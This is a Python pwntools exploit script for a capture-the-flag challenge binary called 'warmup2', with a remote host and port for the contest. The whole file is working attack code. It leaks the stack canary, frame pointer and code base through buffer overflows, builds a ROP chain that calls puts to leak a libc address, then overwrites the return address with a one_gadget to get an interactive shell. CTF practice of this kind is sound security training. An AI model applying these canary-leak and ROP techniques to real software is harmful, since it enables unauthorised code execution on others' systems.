from pwn import *

context(terminal=['tmux','new-window'])

fname = './chal'
local = True
debug = False
host,port = 'warmup2.ctf.maplebacon.org',1337
r = process(fname) if local else remote(host,port)

p = ELF(fname)
libc = ELF('libc_w2.so')

pop_rdi_ret = 0x0000000000001353
call_puts = 0x124e

magic = 0xe3b2e
pop_r_registers = 0x000000000000134c

def header():
    r.recvline()

def exp1(b,q):
    r.send(b.encode()*q)


def get_canary():
    x = r.recvline()
    print(x)
    canary = u64(b'\x00'+x[271:278])
    new_frame = u64(x[278:284]+b'\x00'*2)
    recvline()
    return canary,new_frame 

def get_code_section():
    x = r.recvline()
    print(x)

def exp2(canary,frame,ret=None):
    print('canary='+hex(canary))
    print('frame='+hex(frame))
    if not ret: ret = b'\xdd'
    r.send(b"x"*263+b"\x00"+p64(canary)+p64(frame)+ret)

def exp3():
    r.send(b'x'*8)

def exp4():
    if debug: gdb.attach(r,'')
    r.send(b'x'*152)

def recvline():
    print(r.recvline())

def leak_code():
    x = r.recvline()
    code = u64(x[286:292]+b'\x00'*2)
    code-=4834
    print('code='+hex(code))
    return code

def leak_libc():
    x = r.recvline()
    x = u64(x[:-1]+b'\x00'*2)
    print(hex(x))
    return x

if __name__=='__main__':
    header()
    exp1('x',265)
    canary,frame = get_canary()
    exp2(canary,frame)
    header()
    r.recvline()
    exp1('x',280)
    code = leak_code()
    print('pop_rdi_ret@'+hex(code+pop_rdi_ret))
    
    r.recvline()
    print('got.puts =' +hex(p.symbols['got.puts']+code) )
    exp2(canary,frame+32,p64(code+pop_rdi_ret)+p64(p.symbols['got.puts']+code)+p64(code+call_puts)+b'xxxxxxxx'+p64(canary)+p64(frame)+p64(code+pop_r_registers)+p64(0x0)*4+p64(code+p.sym['vuln']))
    r.recvline()
    puts = leak_libc()
    magic += (puts - libc.sym['puts']) 
    print('magic = '+hex(magic))    
    r.sendline(b'a'*64)
    header()
    exp1('a',1)
    r.recvline()
    r.recvline()
    if debug: gdb.attach(r,'')
    r.sendline(b'a'*256+b'b'*8+p64(canary)+b'x'*8+p64(code+pop_r_registers)+p64(0x0)*4+p64(magic))
    r.interactive()
